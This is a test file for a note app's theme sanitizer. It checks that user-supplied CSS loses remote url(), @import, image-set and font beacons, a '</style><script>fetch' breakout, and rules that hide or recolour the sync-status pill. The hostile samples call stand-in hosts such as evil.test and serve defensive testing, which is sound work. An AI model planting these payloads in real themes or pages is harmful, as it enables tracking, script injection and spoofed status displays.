/**
 * Theme resolution and the user-theme sanitizer.
 *
 * The sanitizer is load-bearing, not hygiene: a theme file arrives with a
 * shared vault — i.e. it is another person's content — and CSS `url()` is a
 * working beacon out of a local-first app. These are the cases it must catch.
 */
import { readFileSync } from 'node:fs'
import { getLL } from '@ohhi/i18n'
import { BUILTIN_THEMES, DARK_THEMES, DEFAULT_DARK_THEME, DEFAULT_LIGHT_THEME } from '@ohhi/ui/tokens'
import { describe, expect, it } from 'vitest'
import { builtinThemeLabel, sanitizeThemeCss } from './theme.svelte.js'

describe('the built-in theme registry', () => {
  it('labels every built-in from the dictionary, and no custom theme', () => {
    const labels = BUILTIN_THEMES.map((t) => builtinThemeLabel(getLL(), t))
    expect(labels.every((l) => typeof l === 'string' && l.length > 0)).toBe(true)
    expect(new Set(labels).size, 'two built-ins share a label').toBe(BUILTIN_THEMES.length)
    expect(builtinThemeLabel(getLL(), 'editor-light')).toBe('Oh hi Light')
    expect(builtinThemeLabel(getLL(), 'editor-dark')).toBe('Oh hi Dark')
    expect(builtinThemeLabel(getLL(), 'my-theme')).toBeNull()
  })

  /**
   * The pre-paint script in index.html cannot import the registry, so it
   * carries its own list of dark built-ins (for band C's `data-polarity`) and
   * its own `system` defaults. Kept in step here, or a dark built-in's first
   * frame paints the light sync colours.
   */
  it('keeps the pre-paint script in step with the registry', () => {
    const html = readFileSync(new URL('../../index.html', import.meta.url), 'utf8')
    const list = html.match(/var DARK = \[([^\]]*)\]/)?.[1]
    expect(list, 'index.html has no DARK list').toBeTruthy()
    const dark = [...list!.matchAll(/'([^']+)'/g)].map((m) => m[1])
    expect(new Set(dark)).toEqual(new Set(DARK_THEMES))
    expect(html).toContain(`osDark ? '${DEFAULT_DARK_THEME}' : '${DEFAULT_LIGHT_THEME}'`)
    expect(html).toContain("setAttribute('data-polarity'")
  })
})

describe('sanitizeThemeCss', () => {
  it('strips @import, the simplest exfiltration', () => {
    expect(sanitizeThemeCss('@import url("https://evil.test/x.css");\n:root{--ed-ink:#fff}')).not.toContain(
      'evil.test'
    )
  })

  it('strips a remote url() while keeping the rule', () => {
    const out = sanitizeThemeCss(':root{background-image:url(https://evil.test/beacon.png)}')
    expect(out).not.toContain('evil.test')
    expect(out).toContain('background-image')
  })

  it('strips a quoted and a whitespace-padded url()', () => {
    expect(sanitizeThemeCss("a{background:url( 'https://evil.test/x' )}")).not.toContain('evil.test')
    expect(sanitizeThemeCss('a{background:url("//evil.test/x")}')).not.toContain('evil.test')
  })

  it('strips a remote @font-face src', () => {
    const out = sanitizeThemeCss('@font-face{font-family:x;src:url(https://evil.test/f.woff2)}')
    expect(out).not.toContain('evil.test')
  })

  it('keeps a data: URI so a theme can still ship an inline asset', () => {
    const out = sanitizeThemeCss(':root{background:url(data:image/png;base64,AAAA)}')
    expect(out).toContain('data:image/png')
  })

  it('neutralises an attempt to break out of the <style> element', () => {
    const out = sanitizeThemeCss('a{}</style><script>fetch("https://evil.test")</script>')
    expect(out).not.toContain('</style>')
  })

  it('strips image-set(), which fetches a bare string as a URL', () => {
    const out = sanitizeThemeCss(
      ':root{background-image:image-set("https://tracker.test/x.png" 1x)}'
    )
    expect(out).not.toContain('tracker.test')
  })

  it('strips -webkit-image-set and cross-fade too', () => {
    expect(sanitizeThemeCss('a{background:-webkit-image-set("https://t.test/x" 1x)}')).not.toContain(
      't.test'
    )
    expect(sanitizeThemeCss('a{background:cross-fade("https://t.test/x" 50%)}')).not.toContain(
      't.test'
    )
  })

  it('does not let a comment hide a directive', () => {
    expect(sanitizeThemeCss('/* */@import "https://evil.test/x";')).not.toContain('evil.test')
  })

  it('strips every --ed-sync-* declaration, wherever it is written', () => {
    // Custom properties INHERIT, so `body { --ed-sync-ok: red }` would be the
    // only declaration on <body> and the pill would inherit it — cascade
    // layers never enter the picture. This is defence one of two.
    const out = sanitizeThemeCss(
      'body{--ed-sync-ok:#f0f;--ed-sync-diverged:#0f0}*{--ed-sync-offline:#f0f}'
    )
    expect(out).not.toContain('--ed-sync')
  })

  it('strips rules that target the pill itself', () => {
    const out = sanitizeThemeCss(
      '.ed-sync-dot{background:#f0f}[data-testid="sync-pill-global"]{display:none}'
    )
    expect(out).not.toContain('ed-sync-dot')
    expect(out).not.toContain('display:none')
  })

  it('strips rules aimed at EVERY pill and dot surface, not just the global pill', () => {
    const attacks = [
      '[data-testid="toolbar-vault-pill"]{display:none}',
      '[data-testid^="pane-sync-dot"]{display:none}',
      '[data-testid^="shared-room-pill:"]{visibility:hidden}',
      '[data-status]{opacity:0}',
      '[data-status="green"] > span{background:#f00}',
      'button:has(> .x){display:none}',
      '.toolbar [data-testid*="ill"]{display:none}',
      '@media (min-width:1px){[data-testid="sync-pill-note"]{display:none}}',
      // The sync ICON (foundations-plan P5): its glyph and the shapes in it.
      '.ed-sync-icon{stroke:#f00}',
      'svg.ed-sync-icon path{display:none}',
      '[data-testid="sync-readout"] svg{opacity:0}',
    ]
    for (const css of attacks) {
      const out = sanitizeThemeCss(css)
      expect(out, css).not.toMatch(/display:none|visibility:hidden|opacity:0|#f00/)
    }
    // …while a neighbouring ordinary rule survives.
    expect(sanitizeThemeCss('[data-testid="toolbar-vault-pill"]{display:none}.cm-content{color:#123}')).toBe(
      '.cm-content{color:#123}'
    )
  })

  it('strips !important, which would otherwise outrank every unlayered rule', () => {
    // Counter-intuitive but decisive: for IMPORTANT declarations, layer order
    // reverses and unlayered has the LOWEST priority. A layered
    // `!important` therefore beats anything libs/ui writes, so it cannot be
    // allowed through the loader.
    const out = sanitizeThemeCss('[data-theme="x"]{--ed-surface:#000 !important}')
    expect(out).not.toMatch(/!\s*important/i)
    expect(out).toContain('--ed-surface')
  })

  it('leaves an ordinary theme untouched', () => {
    const css = '[data-theme="mine"]{color-scheme:dark;--ed-surface:#2e3440;--ed-h1:#bf616a}'
    expect(sanitizeThemeCss(css)).toBe(css)
  })
})
